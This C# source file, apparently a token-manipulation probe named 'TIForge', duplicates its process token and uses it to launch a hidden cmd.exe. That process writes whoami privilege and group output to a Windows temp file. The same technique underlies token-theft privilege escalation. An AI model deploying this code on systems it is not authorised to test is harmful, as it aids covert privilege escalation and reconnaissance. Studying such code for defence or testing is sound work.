using System;
using System.Runtime.InteropServices;
public class TIForge {
    [DllImport("advapi32.dll", SetLastError=true)]
    static extern bool OpenProcessToken(IntPtr h, uint a, out IntPtr t);
    [DllImport("advapi32.dll", SetLastError=true)]
    static extern bool DuplicateTokenEx(IntPtr s, uint a, IntPtr z, int l, int t, out IntPtr d);
    [DllImport("kernel32.dll", SetLastError=true)]
    static extern bool CloseHandle(IntPtr h);
    [DllImport("advapi32.dll", SetLastError=true)]
    static extern bool CreateProcessWithTokenW(IntPtr h, uint f, string app, string cmd, uint fl, IntPtr e, string d, ref SI si, out PI pi);
    [DllImport("kernel32.dll")]
    static extern IntPtr GetCurrentProcess();

    struct SI { public int cb; public string r; public string d; public string t;
        public int x; public int y; public int xs; public int ys;
        public int xc; public int yc; public int fa; public int f;
        public short w; public short r2; public IntPtr rp;
        public IntPtr hi; public IntPtr ho; public IntPtr he; }
    struct PI { public IntPtr p; public IntPtr t; public int i; public int j; }

    public static string Run() {
        string result = "";
        IntPtr ht;
        if (!OpenProcessToken(GetCurrentProcess(), 0x02000000, out ht))
            return "FAIL_OPEN:" + Marshal.GetLastWin32Error();

        IntPtr hd;
        if (!DuplicateTokenEx(ht, 0x1F0001, IntPtr.Zero, 2, 1, out hd)) {
            CloseHandle(ht);
            return "FAIL_DUP:" + Marshal.GetLastWin32Error();
        }
        CloseHandle(ht);

        SI si = new SI();
        si.cb = Marshal.SizeOf(typeof(SI));
        si.d = "WinSta0\\Default";
        PI pi;
        if (CreateProcessWithTokenW(hd, 0, "cmd.exe",
            "/c whoami > C:\\Windows\\Temp\\FORGE_OUT.txt && whoami /priv >> C:\\Windows\\Temp\\FORGE_OUT.txt && whoami /groups >> C:\\Windows\\Temp\\FORGE_OUT.txt",
            0x08000000, IntPtr.Zero, "C:\\Windows\\System32", ref si, out pi)) {
            result = "PROC_OK pid=" + pi.i;
            CloseHandle(pi.p); CloseHandle(pi.t);
        } else {
            result = "PROC_FAIL:" + Marshal.GetLastWin32Error();
        }
        CloseHandle(hd);
        return result;
    }
}
